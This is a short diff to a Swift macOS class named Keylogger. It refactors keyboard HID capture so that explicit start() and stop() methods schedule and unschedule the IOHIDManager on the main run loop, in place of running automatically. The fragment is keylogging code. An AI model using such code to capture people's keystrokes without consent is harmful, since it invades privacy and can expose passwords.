@@ -74,12 +74,7 @@ class Keylogger
         {
             print("Can't open HID!")
         }
-        
-        /* Scheduling the loop */
-        scheduleHIDLoop()
-       
-        /* Running in Loop */
-        RunLoop.current.run()
+
     }
     
     @objc dynamic func activatedApp(notification: NSNotification)
@@ -134,11 +129,17 @@ class Keylogger
         return IOHIDManagerOpen(manager, IOOptionBits(kIOHIDOptionsTypeNone));
     }
     
-    func scheduleHIDLoop()
+    /* Scheduling the HID Loop */
+    func start()
     {
         IOHIDManagerScheduleWithRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue)
     }
     
+    /* Un-scheduling the HID Loop */
+    func stop()
+    {
+        IOHIDManagerUnscheduleFromRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue);
+    }
     
     
     var keyMap: [UInt32:[String]]
